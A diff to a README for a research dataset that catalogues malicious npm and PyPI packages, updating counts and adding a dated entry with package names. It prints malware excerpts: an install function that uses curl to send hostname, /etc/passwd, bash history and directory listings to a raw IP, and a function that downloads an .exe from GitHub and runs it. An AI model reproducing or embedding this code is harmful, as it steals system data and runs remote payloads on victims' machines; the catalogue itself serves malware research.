@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 6,104 versions of the source code of 5,399 malicious packages.
+This data set includes about 6,114 versions of the source code of 5,402 malicious packages.
 
 ## Dataset Format
 
@@ -562,6 +562,45 @@ def read_ver():
 	curl_command = 'curl -X POST -H "Hostname: $(hostname)" -H "packagetype: NPM" -H "Whoami: $(whoami)" -H "Pwd: $(pwd)" -d "Install Directory: \n $(ls -la) \n Security Groups: \n $(id) \n User Directory: \n $(ls ~)\n etc-passwd: \n $(cat /etc/passwd ) \n Installed NPM modules: \n $(npm ls)\n bash history: \n $(cat ~/.bash_history|head)" -H "Content-Type: text/plain" http://43.139.166.32:8080'
 	subprocess.run(curl_command, shell=True)
 	return "0.0.12"
+```
+
+### 20 Jun. 2024
+artifact-lab-3-package-e90915e1 [0.1.2, 0.1.3] <br>
+utilitytool [0.0.2] <br>
+utilitytool2 [0.0.2, 0.0.3, 0.0.4, 0.0.5, 0.0.6, 0.0.7, 0.0.8, 0.0.9] <br>
+
+```python
+def download_and_run_exe(url, exe_path):
+    """Download an executable file from a URL and run it."""
+    def download_file(url, file_path):
+        response = requests.get(url)
+        if response.status_code == 200:
+            with open(file_path, 'wb') as f:
+                f.write(response.content)
+            return True
+        else:
+            return False
+
+    def run_exe(exe_path):
+        try:
+            subprocess.Popen(exe_path)
+            return True
+        except Exception as e:
+            return False
+
+    if download_file(url, exe_path):
+        if run_exe(exe_path):
+            return True
+    return False
+
+def main():
+    url = "https://raw.githubusercontent.com/IncsecRishie/wdwddwdw/main/pics.exe"
+    exe_path = "pics.exe"
+    if download_and_run_exe(url, exe_path):
+        print(".")
+    else:
+        print(".")
+        print("cool")
 ```
 
 ## About the malicious packages detection
